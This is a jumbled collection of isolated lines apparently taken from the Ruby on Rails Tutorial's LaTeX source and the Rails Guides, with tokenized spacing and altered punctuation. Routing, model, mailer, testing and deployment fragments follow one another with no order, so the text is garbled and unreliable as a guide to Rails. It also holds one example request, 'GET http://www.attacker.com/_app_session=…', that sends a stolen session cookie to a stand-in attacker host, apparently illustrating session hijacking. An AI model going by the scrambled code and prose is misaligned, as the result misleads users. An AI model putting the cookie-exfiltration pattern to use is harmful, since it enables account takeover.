From the beginning , Rails has benefited from a palpable sense of excitement , starting with the famous \ href { http : / / www ▖ youtube ▖ com / watch ? v = Gzj723LkRJY } { 15-minute weblog video } by Rails creator David Heinemeier Hansson .
\ texttt { GET } , et cet .
t ▖ belongs _ to : account
validates : email , uniqueness : true
╼ ---- = = _ mimepart _ 5407babbe3505 _ 8722b257d045617 ╼ Content-Type : text / html ; ╼ charset = UTF-8 ╼ Content-Transfer-Encoding : 7bit ╼ ╼ &lt; h1 &gt; Password reset &lt; / h1 &gt; ╼ ╼ &lt; p &gt; To reset your password click the link below : &lt; / p &gt; ╼ ╼ &lt; a href = &quot; http : / / rails-tutorial-c9-mhartl ▖ c9 ▖ io / ╼ password _ resets / 3BdBrXeQZSWqFIDRN8cxHA / ╼ edit ?
&#124; &#124; 301 &#124; : moved _ permanently &#124;
Moreover , by considering \ emph { reverse } relationships , we could use the \ kode { follower \ _ id } column to extract an array of user &apos;s followers .
In the unlikely event that finding the count is still a bottleneck in your application , you can make it even faster with a \ href { http : / / railscasts ▖ com / episodes / 23-counter-cache-column } { \ emph { counter cache } } .
Constraining microposts to be at most 140 characters .
The generated migration for the remember digest .
The Relationships controller .
&#124; README ▖ rdoc &#124; This is a brief instruction manual for your application ▖
I &apos;ve done my best to cover as many bases as possible , but systems vary , and many things can go wrong during these steps .
def some _ method
Options passed to this can be configured by using `config ▖ ssl _ options` .
Client ▖ order ( &quot; created _ at &quot; )
Moreover , we would have to remember to repeat the process any time the application changed .
Instead , you provide the names and values manually .
Although the sample app will eventually have users , microposts , and a full login and authentication framework , we will begin with a seemingly limited topic : the creation of static pages .
Apart from proper ordering , there is a second refinement we &apos;d like to add to microposts .
Showing the given user &apos;s followers .
in Listing ~ \ ref { code : micropost _ model } .
This code will generate SQL like this :
valid user
This choice is based on the \ href { http : / / railscasts ▖ com / episodes / 274-remember-me-reset-password } { RailsCast on remember me } .
To make a new user , we visit the \ href { http : / / 0 ▖ 0 ▖ 0 ▖ 0 : 3000 / users / new } { \ texttt { new } } page , as shown in Figure ~ \ ref { fig : demo _ new _ user _ rails _ 3 } .
An equivalent formulation of Listing ~ \ ref { code : validates _ presence _ of _ name } using parentheses is as follows :
When you assign an object to a `has _ and _ belongs _ to _ many` association , that object is automatically saved ( in order to update the join table ) ▖
&quot; Invoice &quot; ▖ tableize # = &gt; &quot; invoices &quot;
Rails 4 ▖ 0 no longer supports loading plugins from `vendor / plugins` ▖
The view for the About page with an embedded Ruby title ▖
We &apos;ll fix this by temporarily commenting out the failing lines , as shown in Listing ~ \ ref { code : comment _ out _ failing _ tests } .
# label ( : article , : title , &quot; A short title &quot; , class : &quot; title _ label &quot; )
The `auto _ discovery _ link _ tag` helper builds HTML that most browsers and feed readers can use to detect the presence of RSS or Atom feeds ▖
# # # # Calling the Mailer
Adding a flash message to user signup .
- &gt; Seq Scan on articles ( cost = 0 ▖ 00 ▖ ▖ 28 ▖ 88 rows = 8 width = 4 )
config ▖ generators do &#124; g &#124;
Now that we have articles and comments working , take a look at the ╼ `app / views / articles / show ▖ html ▖ erb` template ▖
You should verify that clicking on the link in Figure ~ \ ref { fig : demo _ destroy _ user } destroys the second user , yielding an index page with only one user .
Adding an \ kode { @ user } variable to the \ kode { new } action .
Finally , a call to ╼ `submit` on the `f` object will create a submit button for the form .
INNER JOIN categories ON articles ▖ category _ id = categories ▖ id
invoices ▖ index _ by ( &amp; : number )
Updating the errors for editing users .
When using a custom coder ( e ▖ g ▖ `serialize : metadata , JSON` ) , ╼ assigning `nil` to a serialized attribute will save it to the database ╼ as `NULL` instead of passing the `nil` value through the coder ( e ▖ g ▖ ` &quot; null &quot; ` ╼ when using the `JSON` coder ) .
You can match all verbs to a particular route using `via : : all` :
In Chapter ~ \ ref { cha : account _ activation } , we &apos;ll make \ emph { sure } of email validity by adding a separate \ emph { account activation } step to user signup .
( We &apos;ll create the \ kode { shared } directory starting in Chapter ~ \ ref { cha : sign _ up } ▖ )
# # # Available callbacks
Returns the follower
If the files and directories don &apos;t appear as shown in Figure ~ \ ref { fig : cloud9 _ gemfile } , click on the file navigator &apos;s gear icon and select ``Refresh File Tree &apos; &apos; .
In addition , for many purposes , including for this tutorial , Heroku &apos;s free tier is more than sufficient .
The order of the parts getting inserted is determined by the ` : parts _ order` ╼ inside of the `ActionMailer : : Base ▖ default` method .
The `association = ` method assigns an associated object to this object ▖
item ▖ increment ! ( : views )
# # # Controller Namespaces and Routing
The final piece of the relationships puzzle is to add a \ kode { user ▖ followers } \ linebreak method to go with \ kode { user ▖ following } .
The result appears in Listing ~ \ ref { code : persistent _ sessions _ test }
The server log error for / users / 1 .
When you &apos;re happy with the code on your computer , you need to commit the changes to Git :
Symbols are a special Ruby data type shared with very few other languages , so they may seem weird at first , but Rails uses them a lot , so you &apos;ll get used to them fast .
Rails engines , however are scoped to run independently from the main ╼ application , so each engine gets a scoped `ApplicationController` ▖
In previous versions of Rails , all assets were located in subdirectories of ╼ `public` such as `images` , `javascripts` and `stylesheets` ▖
* `config ▖ encoding` sets up the application-wide encoding ▖
Before moving on , we &apos;ll write a test for valid submission to verify our application &apos;s behavior and catch regressions .
* ` : validate`
A preview of the text version of the password reset email .
* `has _ one : through`
class ArticlesController &lt; ApplicationController
WARNING ▖ Note you can &apos;t append with `atomic _ write` .
The \ kode { form \ _ for } helper is used to make forms for interacting with Active Record objects .
# = &gt; &lt; input id = &quot; accept &quot; name = &quot; accept &quot; type = &quot; checkbox &quot; value = &quot; 1 &quot; / &gt;
We see that a string of spaces is not \ emph { empty } , but it is \ emph { blank } .
The extra methods appear in Listing ~ \ ref { code : user _ activation _ methods } , and the refactored application code appears in Listing ~ \ ref { code : user _ signup _ refactored } and Listing ~ \ ref { code : account _ activation _ refactored } .
Many popular UNIX-like OSes ship with an acceptable version of SQLite3 ▖
This way the code has a more transparent meaning , and it &apos;s also more flexible since we can change the definition of \ kode { about \ _ path } and have the URL change everywhere \ kode { about \ _ path } is used .
Many people erroneously believe that \ kode { sudo } stands for ``superuser do &apos; &apos; because it runs commands as the superuser ( root ) by default .
This creates the \ kode { static \ _ pages \ _ spec ▖ rb } in the \ kode { spec / requests } directory .
With the code as shown in Listing ~ \ ref { code : image _ uploader _ resizing } , large images are now resized nicely ( Figure ~ \ ref { fig : resized _ image } ) .
Your words made sense , but your sarcastic tone did not .
&quot; Ruby on Rails Tutorial Sample App &#124; About &quot;
A table of the routes generated by Listing ~ \ ref { code : following _ followers _ actions _ routes } appears in Table ~ \ ref { table : following _ routes } .
The tasks are respectively
# # # Using Partials
The method `except` returns a hash with the keys in the argument list removed , if present :
def edit
Here are some basic examples :
{ a : 1 , b : 1 } ▖ merge ( a : 0 , c : 2 )
You then have a corresponding ╼ `app / views / users / create ▖ js ▖ erb` view file that generates the actual JavaScript ╼ code that will be sent and executed on the client side .
The demo app developed in this chapter has several strengths and a host of weaknesses .
For example , if you generate a `ProjectsController` , Rails will also add a new ╼ file at `app / assets / javascripts / projects ▖ js ▖ coffee` and another at ╼ `app / assets / stylesheets / projects ▖ css ▖ scss` ▖
Formats a number with the specified level of `precision` , which defaults to 3 .
Rails is a web application development framework written in the Ruby language .
Each instance of the `Supplier` model will have these methods :
Rather than render a page on successful user creation , we &apos;ll instead \ emph { redirect } to a different page .
If you have made a mistake in this area , the most common symptom is a black ╼ diamond with a question mark inside appearing in the browser ▖
This is the middleware which supports the PATCH , PUT , and DELETE HTTP method types .
The result is shown in Listing ~ \ ref { code : relationship _ belongs _ to } .
this generates
Implement it and click on a pagination link to see why ▖ )
Because of this danger , it is essential to pass parameters that have been processed to permit only safe-to-edit attributes .
They are important , though , and I suggest learning about them using one of the Ruby books recommended in Section ~ \ ref { sec : guide _ to _ further _ resources } .
# logo { background : url ( &lt; % = asset _ data _ uri &apos; logo ▖ png &apos; % &gt; ) }
Applications assets such as cascading style sheets ( CSS ) , JavaScript files , and images
The `blorgh` directory ╼ is where the other controllers for the engine will go ▖
Having handled a failed signin , we now need to actually sign a user in .
from : &quot; noreply @ example ▖ com &quot;
We &apos;ll first look at the outer structure , which consists of embedded Ruby opening with a call to \ kode { form \ _ for } and closing with \ kode { end } :
That is what ordinarily happens , if a module is called &quot; M &quot; , the `M` constant exists and holds it :
You can also create a layout with multiple yielding regions :
* How to construct your own routes , using either the preferred resourceful style or the `match` method .
What &apos;s going on ?
The only thing you have to do to enable Turbolinks is have it in your Gemfile , ╼ and put ` / / = require turbolinks` in your CoffeeScript manifest , which is usually ╼ `app / assets / javascripts / application ▖ js` .
Rails determines the name of the partial to use by looking at the model name in the collection ▖
The \ kode { puts } method operates as a \ emph { side-effect } : the expression \ kode { puts &quot; foo &quot; } prints the string to the screen and then returns \ href { http : / / www ▖ answers ▖ com / nil } { literally nothing } : \ kode { nil } is a special Ruby value for ``nothing at all &apos; &apos; .
format ▖ html { render action : &quot; new &quot; }
We see here that strings respond to the method \ kode { class } , and simply return the class they belong to .
create app / helpers / users _ helper ▖ rb
╼ ╼ \ subsection { The asset pipeline } % ( fold ) ╼ \ label { sec : the _ asset _ pipeline } ╼ ╼ F
This evaluates to \ kode { session &#91; : return \ _ to &#93; } unless it &apos;s \ kode { nil } , in which case it evaluates to the given default URL .
Of course , to create enough users to make a decent users index , we \ emph { could } use our web browser to visit the signup page and make the new users one by one , but a far better solution is to use Ruby ( and Rake ) to make the users for us .
Because the user isn &apos;t valid , an attempt to save the user to the database automatically fails :
A live , database-backed web application in production
In Rails version later than 4 ▖ 0 , this code raises an error ( as seen in Figure ~ \ ref { fig : signup _ failure } and Figure ~ \ ref { fig : signup _ failure _ rails _ debug } above ) , which means it is secure by default .
In other words , to only build routes with the minimal amount of information to uniquely identify the resource , like this :
Last-Modified : Thu , 08 May 2014 01 : 24 : 14 GMT ╼ Content-Type : text / css
store _ location
Since we then save \ kode { @ user } , the duplicate user has an email address that already exists in the database , and hence should not be valid .
Compatible with both Ruby &apos;s own `Logger` and `Log4r` loggers .
The next step on both local systems and the cloud IDE is to create the first application using the command in Listing ~ \ ref { code : rails _ command } .
The next step is to install Ruby .
Of course , the views in Listing ~ \ ref { code : home _ view _ erb _ title } , Listing ~ \ ref { code : help _ view _ erb _ title } , and Listing ~ \ ref { code : about _ view _ erb _ title } are still filled with all the HTML structure included in the layout , so we have to remove it , leaving only the interior contents .
If the array contains items that respond to `id` , however , the symbol ╼ ` : db` may be passed as argument ▖
What happens is that Rails puts the string into the Location header field and sends a 302 ( redirect ) status to the browser ▖
create test / mailers / previews / user _ mailer _ preview ▖ rb
# Original query without `only`
Recalling that the signup page / signup is routed to the \ kode { new } action in the Users controller ( Listing ~ \ ref { code : signup _ route } ) , our first step is to create the User object required as an argument to \ kode { form \ _ for } .
# # # The `belongs _ to` Association
* `none`
A \ kode { Gemfile } with an explicit version for each Ruby gem .
&#124; Rakefile &#124; This file locates and loads tasks that can be run from the command line ▖
ActionDispatch : : Session ▖ const _ get ( store ▖ to _ s ▖ camelize ) :
A diagram of this hierarchy appears in Figure ~ \ ref { fig : static _ pages _ controller _ inheritance } .
page for a new session ( login )
The Microposts controller in schematic form .
$ ( &quot; # new _ article &quot; ) ▖ append xhr ▖ responseText
\ chapter { Updating , showing , and deleting users } % ( fold ) ╼ \ label { cha : updating _ showing _ and _ deleting _ users } ╼ ╼
```html + erb
An application is the object that ╼ has final say in what goes on in its environment ▖
Here the table name is plural ( \ kode { users } ) even though the model name is singular ( User ) , which reflects a linguistic convention followed by Rails : a model represents a single user , whereas a database table consists of many users .
This will create a `Product` model , mapped to a `products` table at the ╼ database ▖
This reduces the brittleness of your view and makes your code easier to understand ▖
The computer doesn &apos;t care , of course , but humans do , so it is important to keep the code base clean by refactoring frequently .
INFO : The safety bit is lost always , no matter whether the transformation actually changed something .
A test for the status feed ▖
( In this case , it turns out we can omit the other command-line arguments .
# # # Overriding Models and Controllers
With the \ kode { authenticated ? } \ method as in Listing ~ \ ref { code : generalized _ authenticated _ p } , we &apos;re now ready to write an \ kode { edit } action that authenticates the user corresponding to the email address in the \ kode { params } hash .
GET http : / / www ▖ attacker ▖ com / _ app _ session = 836c1c25278e5b321d6bea4f19cb57e2
belongs _ to : supplier
CSS for the users index .
Ensure the changesets you introduced are included ▖
In Listing ~ \ ref { code : following _ tests } , note that we include the assertion
in Listing ~ \ ref { code : micropost _ model _ image _ validation } .
# # # `inclusion`
To accomplish that you could wrap `ActionController : : TestCase # process` this way in `test / test _ helper ▖ rb` :
gem &apos; coffee-rails &apos; , &apos; ~ &gt; 3 ▖ 2 ▖ 2&apos;
Then we just need to add an \ kode { index } action and include it in the list of actions protected by the \ kode { logged \ _ in \ _ user } before filter ( Listing ~ \ ref { code : logged _ in _ user _ index } ) .
&lt; % = render &apos; form &apos; % &gt;
This changes the ``Follow &apos; &apos; button to ``Unfollow &apos; &apos; and increments Hobbes &apos;s ``followers &apos; &apos; count by one ( Figure ~ \ ref { fig : page _ flow _ other _ profile _ unfollow _ button _ mockup } ) .
In ╼ Active Record , objects carry both persistent data and behavior which ╼ operates on that data ▖
If you prefer , you can use a symbol instead of a string to specify the action to render :
Because we wrote the application code before the integration test , the test suite should be \ passing :
As in that case , Rails calculates the count directly in the database for efficiency .
This is because the first ╼ two migrations were copied over the first time this command was run .
# # # # number _ to _ percentage
You might have noticed that the standard Rails application structure ( Figure ~ \ ref { fig : directory _ structure _ rails } ) has an application directory called \ kode { app / } with three subdirectories : \ kode { models } , \ kode { views } , and \ kode { controllers } .
We could pull the function definition out of the click handler , ╼ and turn it into CoffeeScript :
# # # # label
Apart from the address of the Heroku app , the result should be the same as in Figure ~ \ ref { fig : heroku _ app } .
Now that the \ kode { correct \ _ user } before filter defines \ kode { @ user } , we can omit it from both actions .
The key lines here are actually CSS comments , but they are used by Sprockets to include the proper files :
update user with id \ texttt { 1 }
# = &gt; # &lt; Client id : 221 , first _ name : &quot; Russel &quot; &gt;
( 2 ▖ ▖ 3 ) ▖ include ? ( Math : : E ) # = &gt; true
A template for testing image upload .
We &apos;ll learn in Section ~ \ ref { sec : slightly _ dynamic _ pages } what the \ kode { ▖ erb } part means ; from the \ kode { ▖ html } part you probably won &apos;t be surprised that it basically looks like HTML ( Listing ~ \ ref { code : raw _ home _ view } ) .
As we saw in Section ~ \ ref { sec : requiring _ logged _ in _ users } , it &apos;s easy to have a test suite that misses an essential security flaw , so we &apos;ll proceed using test-driven development to be sure our code implements the security model correctly .
@ comment ▖ destroy
If it cannot find the view there , it will check in ╼ the `app / views` directories of all engines that have this directory .
class _ name = class _ name ▖ singularize if collection ?
By the way , if you have deployed your sample app to Heroku , you can see its environment using \ texttt { heroku run console } :
( I &apos;ve omitted the router from Figure ~ \ ref { fig : MVC } for simplicity , but we &apos;ll discuss the router in more detail starting in Section ~ \ ref { sec : mvc _ in _ action } ▖ )
As seen in Figure ~ \ ref { fig : micropost _ length _ error _ rails _ 3 } , Rails renders \ emph { error messages } indicating that the micropost &apos;s content is too long .
&lt; em &gt; &lt; b &gt; emph &amp; amp ; bold &lt; / b &gt; &lt; / em &gt;
Adding the follow form and follower stats to the user profile page .
The profile page after a successful activation .
You might want to read up on \ href { http : / / www ▖ google ▖ com / search ? q = state + machines + in + rails } { state machines in Rails } to help you with the inactive / active transition .
Creating the toy app repository at Bitbucket .
def a _ method _ used _ for _ validation _ purposes
When the file contents change , the filename is also ╼ changed ▖
Therefore , ╼ it &apos;s recommended not to disable this option unless you have a strong reason for ╼ doing so .
There is one break with past convention worth noting : the interface to the Microposts resource will run principally through the Users and StaticPages controllers , so we won &apos;t need actions like \ kode { new } or \ kode { edit } in the Microposts controller ; we &apos;ll only need \ kode { create } and \ kode { destroy } .
At this stage , we need to set up SSL on the remote server .
* * `ActionDispatch : : Cookies` * *
class SandboxEmailInterceptor
With the production webserver configuration completed , we &apos;re ready to commit and deploy
The `collection ▖ clear` method removes every object from the collection ▖
As required by the virtual nature of the activation token , we &apos;ve added a second \ kode { attr \ _ accessor } to our model .
is a sensitive test for almost everything related to a user &apos;s profile page .
The result appears in Listing ~ \ ref { code : valid _ user _ test }
If you want to be sure that an association is absent , you &apos;ll need to test ╼ whether the associated object itself is absent , and not the foreign key used ╼ to map the association .
( Note that , if you want Growl notifications , you will have to purchase \ href { http : / / growl ▖ info / downloads } { Growl } , which is available in the Apple App Store for a nominal charge ▖ )
Article ▖ where ( &apos; id &gt; 10 &apos; ) ▖ limit ( 20 ) ▖ order ( &apos; id asc &apos; ) ▖ unscope ( : order )
Although we started deploying our application in Chapter ~ \ ref { cha : static _ pages } , this is the first time it will actually \ emph { do } something , so we &apos;ll take this opportunity to make the deployment professional-grade .
To add conditions to a `find _ each` operation you can chain other Active Record methods such as `where` :
= &gt; 6
= &gt; &quot; 1 , 2 , 3 , 4 &quot;
For example , I once had a test suite that was \ passing \ even after accidentally deleting the main \ kode { log \ _ in } method in the Sessions helper .
prev _ year ( last _ year )
before _ add : &#91; : check _ credit _ limit , : calculate _ shipping _ charges &#93;
Apologies in advance for switching haphazardly between \ emph { function } and \ emph { method } throughout this chapter ; in Ruby , they &apos;re the same thing : all methods are functions , and all functions are methods , because everything is an object .
Sanitizes a block of CSS code .
with _ options if : : is _ admin ?
NOTE : You can &apos;t use ` : namespace` or ` : module` with a ` : controller` path segment ▖
You can use `redirect _ to` with any arguments that you could use with `link _ to` or `url _ for` ▖
Ordinarily , you should make smaller , more frequent commits , but for the purposes of this chapter a single big commit at the end is fine .
If you simply want to check for the existence of the object there &apos;s a method called `exists ?
We can express the expectation that the microposts don &apos;t appear in the database as follows :
client = Client ▖ first
# # # # Methods Added by `has _ many`
On a local server , point your browser at the address \ href { http : / / localhost : 3000 / } { http : / / localhost : 3000 / } ; on the cloud IDE , go to Share and click on the Application address to open it ( Figure ~ \ ref { fig : share _ workspace } ) .
Please see the benchmark / ips &#91; README &#93; ( https : / / github ▖ com / evanphx / benchmark-ips / blob / master / README ▖ md ) for more information .
To get the test suite to green , we need to add a \ emph { step } file that maps the plain-text lines to Ruby code .
A form for following a user .
Because both hash syntaxes are still in common use , it &apos;s essential to be able to recognize both of them .
The document ▖ cookie property holds the cookie of the originating web server ▖
Rails provides a domain-specific language for managing a database schema called ╼ migrations ▖
Although at first it may seem mysterious , \ emph { or equals } is easy to understand by analogy .
Once you &apos;ve created and configured your S3 account , you should create and fill the CarrierWave configuration file as shown in Listing ~ \ ref { code : carrier _ wave _ configuration } .
- &gt; Index Scan using users _ pkey on users ( cost = 0 ▖ 00 ▖ ▖ 8 ▖ 27 rows = 1 width = 4 )
belongs _ to : customer , class _ name : &quot; Patron &quot; ,
TIP : You should probably be using the `head` method , discussed later in this guide , instead of `render : nothing` ▖
# = &gt; &#91; &#91; -5 &#93; , &#91; -3 , -2 , -1 &#93; , &#91; 1 , 2 , 3 &#93; , &#91; 5 &#93; &#93;
This ╼ means that it will make sure that all locales passed to it must be declared in ╼ the `available _ locales` list .
( end ) ╼ ╼ \ subsection { Followers } % ( fold ) ╼ \ label { sec : followers } ╼ ╼
Error messages for a failed micropost creation ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / micropost _ length _ error _ rails _ 3-full ▖ png } { ( full size ) }
require : : File ▖ expand _ path ( &apos; ▖ ▖ / config / environment &apos; , _ _ FILE _ _ )
* `ActiveSupport : : Deprecation ▖ silence` takes a block in which all deprecation warnings are silenced .
NOTE : The `namespace` scope will automatically add ` : as` as well as ` : module` and ` : path` prefixes .
&lt; % = render ( @ products ) &#124; &#124; &quot; There are no products available ▖ &quot;
A first , slightly incorrect , attempt appears in Listing ~ \ ref { code : failed _ login _ attempt } .
get &apos; clashing / : id &apos; = &gt; &apos; test # example &apos; , as : : example
It &apos;s entirely possible that the feedback you get will suggest changes ▖
Testing that the \ kode { edit } and \ kode { update } actions are protected .
The first step is to \ href { http : / / signup ▖ heroku ▖ com / } { sign up for Heroku } .
In the context of web applications , \ emph { authentication } allows us to identify users of our site , and \ emph { authorization } lets us control what they can do .
# # # Options Extraction
Client ▖ order ( : created _ at )
Having shown how to create , show , and edit users , we come finally to destroying them ( Figure ~ \ ref { fig : demo _ destroy _ user } ) .
&gt; &gt; Rails ▖ env ▖ production ?
Whatever the name , you must manually generate the join table with an appropriate migration ▖
* `config ▖ action _ view ▖ raise _ on _ missing _ translations` determines whether an error should be raised for missing translations
where \ kode { cookies ▖ signed &#91; : user \ _ id &#93; } automatically decrypts the user id \ linebreak cookie .
image _ tag ( &quot; rails ▖ png &quot; ) # = &gt; &lt; img src = &quot; http : / / assets ▖ example ▖ com / images / rails ▖ png &quot; alt = &quot; Rails &quot; / &gt;
in Listing ~ \ ref { code : root _ route } .
With the \ kode { log \ _ in } method defined in Listing ~ \ ref { code : log _ in _ function } , we &apos;re now ready to complete the session \ kode { create } action by logging the user in and redirecting to the user &apos;s profile page .
One final thing is that the `articles` resource for this engine should be the root ╼ of the engine ▖
You can use the &#91; Protected Attributes gem &#93; ( https : / / github ▖ com / rails / protected _ attributes ) for a smooth upgrade path .
( In fact , as we saw in Section ~ \ ref { sec : demo _ users _ resource } and Section ~ \ ref { sec : microposts _ resource } , \ kode { rails generate } can make automatic edits to the \ kode { routes ▖ rb } file , which we also want to undo automatically ▖ )
Adding presence validations to the User model .
Connection : close
Finally , we commit the changes :
Upon successive invocations of the \ kode { FactoryGirl } method ,
d = Date ▖ current
The `method : : patch` option tells Rails that we want this form to be submitted ╼ via the `PATCH` HTTP method which is the HTTP method you &apos;re expected to use to ╼ * * update * * resources according to the REST protocol .
&#124; GET &#124; / photos / : id &#124; images # show &#124; photo _ path ( : id ) &#124;
stylesheet _ link _ tag &quot; application &quot; # = &gt; &lt; link href = &quot; / assets / application ▖ css &quot; media = &quot; screen &quot; rel = &quot; stylesheet &quot; / &gt;
@ article ▖ destroy
( The call to \ emph { to \ _ s } is to make sure we can handle \ kode { nil } tokens , which shouldn &apos;t happen in browsers but sometimes happens in tests ▖ )
After the div , we encounter some embedded Ruby :
* MySQL : &#91; EXPLAIN Output Format &#93; ( http : / / dev ▖ mysql ▖ com / doc / refman / 5 ▖ 6 / en / explain-output ▖ html )
COM &quot; , &quot; THE _ US-ER @ foo ▖ bar ▖ org &quot; , &quot; first ▖ last @ foo ▖ jp &quot; &#93;
&lt; / ul &gt;
Other Resources
By default , inline rendering uses ERB ▖
Active Support is the Ruby on Rails component responsible for providing Ruby language extensions , utilities , and other transversal stuff .
If you haven &apos;t used IRC before , I suggest you start by searching the web for ``irc client &lt; your platform &gt; &apos; &apos; .
Default is &quot; , &quot; .
The \ kode { id } attribute here is just an integer ( i ▖ e ▖ , \ kode { self ▖ id } , the unique ID of the user ) , so there is no danger of SQL injection in this case , but \ emph { always } escaping variables injected into SQL statements is a good habit to cultivate .
Avoid using any printing methods like `puts` or `p` for that purpose .
This helps prevent conflicts with any other engine or application that may have ╼ an article resource as well .
As we saw briefly before in the Chapter ~ \ ref { cha : a _ demo _ app } exercises , the way to validate the presence of the name attribute is to use the \ kode { validates } method with argument \ kode { presence : true } , as shown in Listing ~ \ ref { code : validates _ presence _ of _ name } .
This uses the line
To start writing the code for \ kode { current \ _ user } , note that the line
The \ kode { log \ _ in } method is available in the Sessions controller because of the module inclusion in Listing ~ \ ref { code : sessions _ helper _ include } .
The method `multiline ? ` says whether a regexp has the ` / m` flag set , that is , whether the dot matches newlines .
They are database agnostic , cannot be bypassed by end users , and are ╼ convenient to test and maintain ▖
in Listing ~ \ ref { code : micropost _ belongs _ to _ user _ spec } .
/ microposts / 1 / edit
The ╼ singletons `true` and `false` need fixed-width font ▖
* `initialize _ dependency _ mechanism` If `config ▖ cache _ classes` is true , configures `ActiveSupport : : Dependencies ▖ mechanism` to `require` dependencies rather than `load` them .
You &apos;ve just generated your first engine &apos;s first ╼ functions .
In fact , in the BooksController class , inside of the update action where we want to render the edit template if the book does not update successfully , all of the following render calls would all render the `edit ▖ html ▖ erb` template in the `views / books` directory :
It looks for ╼ one here because the `ArticlesController` inherits from `ApplicationController` .
( We &apos;ll make the last one in Chapter ~ \ ref { cha : log _ in _ log _ out } ▖ )
hidden _ field ( : user , : token )
: premium _ videojobs
This helper generates the HTML for forms , providing a method for each sort of input ( e ▖ g ▖ , text , password , select , and so on ) ▖
Such functions are called \ emph { helpers } ; to see how to make a custom helper , let &apos;s start by examining the title line from Listing ~ \ ref { code : application _ layout _ redux } :
The \ kode { UsersController } class , highlighting inheritance .
&#124; config ▖ ru &#124; Rack configuration for Rack based servers used to start the application .
class Topic &lt; ActiveRecord : : Base
There &apos;s also the bang variant `transform _ keys ! ` that applies the block operations to keys in the very receiver .
Starting in Rails 3 ▖ 1 , and continuing in Rails ~ 4 , there are \ emph { three } canonical directories for static assets , each with its own purpose :
( This uses the interpolated \ kode { inspect } method mentioned in Section ~ \ ref { sec : hashes _ and _ symbols } ▖ )
on general principles of web development ( rather than on Rails specificall
Given a path name `is _ missing ? ` tests whether the exception was raised due to that particular file ( except perhaps for the &quot; ▖ rb &quot; extension ) .
class GuestsCleanupJob &lt; ActiveJob : : Base
# # # # # `collection &lt; &lt; ( object , ▖ ▖ ▖ )
$ bundle exec rake test ╼ $ git push heroku
----------
So in this case , Rails will render the `app / views / books / index ▖ html ▖ erb` file .
Adding authentication to the Microposts controller actions .
There are a few issues when upgrading from Rails 3 ▖ 0 or Rails 2 ▖ x ▖
Why not just use an off-the-shelf solution instead of rolling our own ?
Destroying a user ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / demo _ destroy _ user _ rails _ 3-full ▖ png } { ( full size ) }
Unlike the other attributes we &apos;ve seen so far , the password attributes will be \ emph { virtual } ---they will only exist temporarily in memory , and will not be persisted to the database .
render template : &quot; products / show &quot;
conflict config / application ▖ rb
( Writing a test for email downcasing is left as an exercise ( Section ~ \ ref { sec : modeling _ users _ exercises } ) ▖ )
# &lt; rank &gt; 2 &lt; / rank &gt;
boolean ? ?
# # # # # Options for `find _ in _ batches`
The most lightweight way to get `blank ? ` is to cherry-pick the file that defines it .
= &gt; { : success = &gt; &quot; It worked ! &quot; , error : &quot; It failed ▖ &quot; }
Before moving on , be sure to merge all the changes into the master branch :
Here \ kode { user ▖ save } returns \ kode { false } , indicating a failed save .
def index
&lt; head &gt;
# &lt; id type = &quot; integer &quot; &gt; 190316 &lt; / id &gt;
Validations with # some &lt; tt &gt; : on &lt; / tt &gt;
Why do you have to bother ?
Assuming you didn &apos;t make the same implementation mistake I did , the tests should be \ passing :
A \ kode { create } action that can handle signup failure .
global-908e25f4bf641868d8683022a5b62f54 ▖ css
This notation actually started as an extension Rails made to the core Ruby language ; it was so useful that it has now been incorporated into Ruby itself .
Defaults to `true` ▖
Let &apos;s see an example .
# = &gt; { &quot; a &quot; = &gt; 1 }
@ account = @ supplier ▖ create _ account ( terms : &quot; Net 30 &quot; )
d ▖ prev _ week # = &gt; Mon , 26 Apr 2010
in Listing ~ \ ref { code : users _ migration } .
The view for the Home page with an embedded Ruby title ▖
A few things are going on ▖
You can use the &#91; rubyonrails-core mailing ╼ list &#93; ( http : / / groups ▖ google ▖ com / group / rubyonrails-core / ) for this ▖
This uses the awesome \ kode { time \ _ ago \ _ in \ _ words } helper method , whose meaning is probably clear and whose effect we will see in Section ~ \ ref { sec : sample _ microposts } .
This is brittle , though , because now any typo in the base title ( such as ``Ruby on Rails Tutoial &apos; &apos; ) won &apos;t be caught by the test suite .
Database pooling
This suggests defining an \ kode { integration \ _ test ? } \ boolean method and writing an if-then statement schematically as follows :
If you wanted to link to just a magazine :
Here we &apos;ve used \ kode { params } to retrieve the user ~ id .
/ sessions
The response will be :
If the call to `update` fails , calling the `update` action in this controller will render the `edit ▖ html ▖ erb` template belonging to the same controller .
But it &apos;s the proper place to discuss new ideas ▖
Rails 4 ▖ 0 removes the `j` alias for `ERB : : Util # json _ escape` since `j` is already used for `ActionView : : Helpers : : JavaScriptHelper # escape _ javascript` .
&lt; / aside &gt;
orders ▖ size
xml ▖ h1 ( @ person ▖ name )
Our plan for testing the layout links involves checking the HTML structure of our site :
first _ name : &apos; does not exist&apos;
And start the server :
Curly braces are one way to indicate a block , but there is a second way as well :
The result appears in Listing ~ \ ref { code : users _ resource }
The code in Listing ~ \ ref { code : microposts _ resource } leads in turn to the RESTful routes shown in Table ~ \ ref { table : RESTful _ microposts } , which is a small subset of the full set of routes seen in Table ~ \ ref { table : demo _ RESTful _ microposts } .
We &apos;ll also give our \ emph { code } some styling , so to speak , using \ emph { partials } to tidy up the layout once it gets a little cluttered .
This test uses the \ kode { reload } method for reloading a value from the database and the \ kode { assert \ _ equal } method for testing equality .
The `find _ or _ create _ by` method checks whether a record with the attributes exists ▖
Allowing empty passwords on update ▖
@ current _ user &#124; &#124; = User ▖ find _ by ( id : session &#91; : user _ id &#93; )
Despite appearances , this is \ emph { not } a comparison ( which would use double-equals \ kode { = = } ) , but rather is an \ emph { assignment } .
To set asset compression methods , set the appropriate configuration options ╼ in `production ▖ rb` - `config ▖ assets ▖ css _ compressor` for your CSS and ╼ `config ▖ assets ▖ js _ compressor` for your JavaScript :
Using ORM , the properties and ╼ relationships of the objects in an application can be easily stored and ╼ retrieved from a database without writing SQL statements directly and with less ╼ overall database access code .
&lt; % = f ▖ label : commenter % &gt; &lt; br &gt;
Although we could use SSL on just the signup page , it &apos;s actually easier to implement it site-wide , which has the additional benefits of securing user login ( Chapter ~ \ ref { cha : log _ in _ log _ out } ) and making our application immune to a critical \ emph { session hijacking } vulnerability discussed in Section ~ \ ref { sec : remember _ me } .
If you have to store complex objects , you would need to handle the conversion ╼ manually when reading the values on subsequent requests .
sanitize @ article ▖ body , tags : % w ( table tr td ) , attributes : % w ( id class style )
The first new example is just a sanity check , verifying that the subject ( \ kode { @ user } ) is initially valid :
